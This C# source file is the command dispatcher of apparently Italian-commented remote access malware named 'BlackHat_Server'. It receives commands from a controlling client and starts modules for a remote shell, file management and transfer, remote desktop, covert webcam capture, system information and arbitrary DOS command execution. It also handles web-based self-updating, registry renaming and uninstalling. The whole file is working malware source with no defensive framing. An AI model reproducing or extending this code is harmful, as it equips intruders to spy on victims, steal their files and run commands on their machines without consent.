using System;
using System.Windows.Forms;
using BlackHat_Server.Class.Comunicator;
using BlackHat_Server.Class.Crypt;
using BlackHat_Server.Muduli.Server_Manager;

namespace BlackHat_Server.Class
{
    // OGGETTO CHE AVVIA IL THREAD RELATIVO AD UN COMANDO DA CLIENT (RICEVUTO DA GUARDIAN)
    internal class CmdInterpreter
    {
        /// <summary>
        ///     AVVIA IL THREAD RELATIVO AL COMANDO
        /// </summary>
        /// <param name="cmd"></param>
        public void Interpreter(string cmd)
        {
            var cmdPar = cmd.Split('|');

            switch (cmdPar[0])
            {
                //// COMANDO CIAO AVVIO TEST COMANDO
                //case "ciao":
                //    CiaoTest ct = new CiaoTest();
                //    ct.StartCiao();
                //    break;

                //CONTROLLO SERVER ATTIVO => RISPONDO I'M HERE
                case "ARE YOU THERE?":
                    var mm = new MsgManager(ST_Client.Instance.Connessione.GetStream());
                    mm.SendEncryMessage("I'M HERE", 5000);
                    break;


                //RICHIESTE SERVER

                #region

                // COMANDO CHIUSURA SERVER                
                case "BH_CLOSE_SERVER":
                    ST_Client.Instance.Connessione.Close();
                    Environment.Exit(0);
                    break;

                // COMANDO RIAVVIO SERVER                
                case "BH_RESTART_SERVER":
                    ST_Client.Instance.Connessione.Close();
                    Application.Restart();
                    break;

                // COMANDO CHIUSURA CONNESSIONE             
                case "BH_DISCONNECT_SERVER":
                    ST_Client.Instance.isConnected = false;
                    break;

                // COMANDO DISINSTALLAZIONE CONNESSIONE             
                case "BH_UNINSTALL_SERVER":
                    var sa = new ServerAgent();
                    sa.UninstallServer(true);
                    break;

                // COMANDO DISINSTALLAZIONE CONNESSIONE             
                case "BH_WEBUPLOAD_SERVER":
                    var saup = new ServerAgent();
                    saup.StartUpdateServerWeb(cmdPar[1]);
                    break;


                //COMANDO DI RINOMINA DEL SERVER
                case "BH_RENAME_SERVER":
                    ST_Client.Instance.ServerName = cmdPar[1];

                    var rm = new RegistryManager();
                    var td = new Text_Des();

                    rm.SetNewNameInRegistry(td.Encrypt(cmdPar[1], true));

                    break;
                //------------------

                #endregion


                // RICHIESTE REMOTE SHELL
                case "REMOTE_SHELL":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        var ms = new ModuleStarter();
                        ms.StartSlotService(cmdPar[0], cmdPar[2]);
                    }

                    //-------------------------
                    break;


                //RICHIESTE MANAGER

                #region

                // COMANDO AVVIO FILEMANAGER
                case "FILEMANAGER":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        var ms = new ModuleStarter();
                        ms.StartSlotService(cmdPar[0], cmdPar[2]);
                    }
                    //-------------------------

                    break;

                // COMANDO AVVIO Nuova Slot Image Tranfer
                case "IMAGESLOT":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        var ms = new ModuleStarter();
                        ms.StartSlotService(cmdPar[0], cmdPar[2]);
                    }

                    //-------------------------                    
                    break;

                // COMANDO AVVIO Nuova Slot Gallery Tranfer
                case "GALLERYSLOT":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        var ms = new ModuleStarter();
                        ms.StartSlotService(cmdPar[0], cmdPar[2]);
                    }

                    //-------------------------                    
                    break;

                // COMANDO AVVIO Nuova Slot FILE Tranfer
                case "FILE_TRANSFER":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        var ms = new ModuleStarter();
                        ms.StartSlotService(cmdPar[0], cmdPar[2]);
                    }

                    //-------------------------                    
                    break;


                // COMANDO AVVIO Nuova Slot Search
                case "SEARCHSLOT":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        var ms = new ModuleStarter();
                        ms.StartSlotService(cmdPar[0], cmdPar[2]);
                    }

                    //-------------------------                    
                    break;

                #endregion

                //--------------

                // RICHIESTE DESKTOP

                #region

                // COMANDO NUOVA COMUNICAZIONE REMOTE DESKTOP         
                case "REMOTE_DESKTOP":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        var mds = new ModuleStarter();
                        mds.StartSlotService(cmdPar[0], cmdPar[2]);
                    }

                    break;

                #endregion

                //---------------

                #region RICHIESTE WEBCAM

                case "WEBCAM_CAPTURE":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        var mds = new ModuleStarter();
                        mds.StartSlotService(cmdPar[0], cmdPar[2]);
                    }

                    break;

                #endregion

                #region RICHIESTE SERVER INFO

                case "SYSTEM_INFO":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        var mds = new ModuleStarter();
                        mds.StartSlotService(cmdPar[0], cmdPar[2]);
                    }

                    break;

                #endregion


                #region RICHIESTE VARIE

                case "BH_RUN_DOS_CMD":
                    var dr = new DosRunner();
                    dr.ExecuteCommand(cmdPar[1]);

                    break;

                #endregion


                // COMANDO NON RICONOSCIUTO
                default:
                    break;
            }
        }
        //-------------------------------------
    }
}